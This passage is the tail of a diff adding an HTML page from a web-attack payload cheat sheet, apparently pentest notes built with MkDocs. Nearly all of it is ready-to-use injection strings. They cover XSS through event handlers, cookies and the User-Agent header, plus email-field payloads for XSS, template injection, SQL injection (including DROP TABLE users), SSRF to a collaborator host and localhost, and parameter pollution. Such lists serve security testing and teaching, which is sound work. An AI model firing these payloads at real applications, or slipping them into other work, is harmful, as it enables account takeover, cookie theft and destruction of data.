+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>&lt;iframe<span class="w"> </span><span class="nv">onload</span><span class="o">=</span>alert<span class="o">(</span><span class="m">1</span><span class="o">)</span>&gt;&lt;/iframe&gt;
+</code></pre></div>
+<h4 id="onerror">onerror</h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>&lt;image<span class="w"> </span>src/onerror<span class="o">=</span>alert<span class="o">(</span><span class="m">1</span><span class="o">)</span>&gt;
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>&lt;img<span class="w"> </span>src/onerror<span class="o">=</span>alert<span class="o">(</span><span class="m">1</span><span class="o">)</span>&gt;
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>&lt;script<span class="w"> </span><span class="nv">onerror</span><span class="o">=</span>alert<span class="o">(</span><span class="m">1</span><span class="o">)</span><span class="w"> </span><span class="nv">src</span><span class="o">=</span>/&gt;&lt;/script&gt;
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>&lt;body<span class="w"> </span><span class="nv">onerror</span><span class="o">=</span>alert<span class="o">(</span><span class="m">1</span><span class="o">)</span><span class="w"> </span><span class="nv">onload</span><span class="o">=</span>/&gt;
+</code></pre></div>
+<h2 id="dom-based">DOM Based</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>javascript:alert<span class="o">(</span>¨DOM<span class="s2">&quot;)</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="s2">&quot;</span>&gt;&lt;script&gt;alert<span class="o">(</span>document.cookie<span class="o">)</span>&lt;/script&gt;
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>alert<span class="o">(</span><span class="m">1</span><span class="o">)</span>
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>alert<span class="o">(</span>document.cookie<span class="o">)</span>
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="c1">#&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</span>
+</code></pre></div>
+<h2 id="user-agent">User-Agent</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>&lt;/SCript&gt;&lt;svG/onLoad<span class="o">=</span>alert<span class="o">(</span>document.domain<span class="o">)</span>&gt;
+</code></pre></div>
+<h2 id="xss-in-cookie-header">XSS in Cookie Header</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>Cookie:<span class="w"> </span><span class="nv">PHPSESSID</span><span class="o">=</span>hd&lt;script&gt;alert<span class="o">(</span>document.cookie<span class="o">)</span>&lt;/script&gt;np5
+</code></pre></div>
+<h2 id="email-recipient-payloads">Email recipient payloads</h2>
+<h4 id="xss_1">XSS</h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>test+<span class="o">(</span>&lt;script&gt;alert<span class="o">(</span><span class="m">0</span><span class="o">)</span>&lt;/script&gt;<span class="o">)</span>@example.com
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>test@example<span class="o">(</span>&lt;script&gt;alert<span class="o">(</span><span class="m">0</span><span class="o">)</span>&lt;/script&gt;<span class="o">)</span>.com
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="s2">&quot;&lt;script&gt;alert(0)&lt;/script&gt;&quot;</span>@example.com
+</code></pre></div>
+<h4 id="template-injection">Template injection</h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="s2">&quot;&lt;= 7 * 7 %&gt;&quot;</span>@example.com
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>test+<span class="o">(</span><span class="si">${</span><span class="p">{7*7</span><span class="si">}</span><span class="o">}</span><span class="w"> </span><span class="o">)</span>@example.com
+</code></pre></div>
+<h4 id="sql-injection">SQL Injection</h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="s2">&quot;&#39; OR 1=1 -- &#39;&quot;</span>@example.com
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="s2">&quot;mail&#39;); DROP TABLE users;--&quot;</span>@example.com
+</code></pre></div>
+<h4 id="ssrf">SSRF</h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>john.doe@abc123.burpcollaborator.net
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>john.doe@<span class="o">[</span><span class="m">127</span>.0.0.1<span class="o">]</span>
+</code></pre></div>
+<h4 id="parameter-pollution">Parameter pollution</h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>victim<span class="p">&amp;</span><span class="nv">email</span><span class="o">=</span>attacker@example.com
+</code></pre></div>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">Portswigger.net Cheatsheet</a></li>
+</ul></p>
+    </article>
+</section>
+            <!-- endblock -->
+
+            <!-- block footer -->
+                <footer>
+    <div class="d-flex flex-sm-row justify-content-between py-2 border-top drac-text-black drac-bg-cyan-green">
+        <a href="https://github.com/dracula/mkdocs" target="_blank" style="padding-left: 1%;"
+            class="footer-text drac-anchor drac-text-black drac-text-purple--hover">
+            Made with Dracula Theme for MkDocs
+        </a>
+    </div>
+</footer>
+            <!-- endblock -->
+        </div>
+
+    </main>
+
+        <script>var base_url = '../..';</script>
+        <script src="../../assets/js/jquery-3.3.1.slim.min.js"></script>
+        <script src="../../assets/js/bootstrap.bundle.min.js"></script>
+        <script src="../../assets/js/mkdocs.js"></script>
+			<script src="../../search/main.js" defer></script>
+
+<script>const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});</script></body>
+
+</html>
